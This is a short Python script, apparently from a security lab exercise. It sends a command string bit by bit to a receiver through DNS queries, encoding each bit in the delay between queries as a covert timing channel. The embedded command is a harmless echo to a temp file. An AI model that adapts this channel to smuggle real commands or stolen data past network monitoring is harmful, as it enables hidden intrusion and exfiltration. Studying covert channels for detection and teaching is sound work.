import time
import socket
import dns.message

secret_command = "echo hello > /tmp/a.txt"

binary_data = ''.join(format(ord(c), '08b') for c in secret_command)

base_domain = "ptitlab.local"
receiver_ip = "177.10.0.2"

def send_bit(bit):
    domain = f"{bit}.{base_domain}"
    query = dns.message.make_query(domain, dns.rdatatype.A)
    data = query.to_wire()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(data, (receiver_ip, 53))
    sock.close()

for bit in binary_data:
    send_bit(bit)
    delay = 0.5 if bit == '0' else 1.5
    time.sleep(delay)

print("Done sending")

